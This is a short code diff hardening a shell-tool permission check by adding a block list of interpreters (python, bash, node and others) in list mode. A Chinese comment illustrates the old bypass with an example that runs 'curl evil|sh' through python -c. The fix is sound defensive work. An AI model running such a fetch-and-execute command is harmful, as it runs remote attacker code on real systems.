@@ -93,6 +93,16 @@ def register_shell_tools(
                 raise PermissionError(
                     f"command '{first_tok}' not in allow-list ({allowed})"
                 )
+            # M4 修复:list 模式下校验首词不在解释器黑名单
+            # 旧逻辑只校验 basename,跳过全部元字符黑名单,可通过
+            # ["python","-c","import os;os.system('curl evil|sh')"] 执行任意代码
+            _INTERP_BLACKLIST = {"python", "python3", "python2", "sh", "bash",
+                                 "zsh", "perl", "ruby", "node", "nodejs", "lua", "php"}
+            if first_tok.lower() in _INTERP_BLACKLIST:
+                raise PermissionError(
+                    f"interpreter '{first_tok}' not allowed in list mode "
+                    "(can execute arbitrary code via -c/-e flags)"
+                )
         else:
             if not isinstance(command, str) or not command.strip():
                 raise PermissionError("empty command")
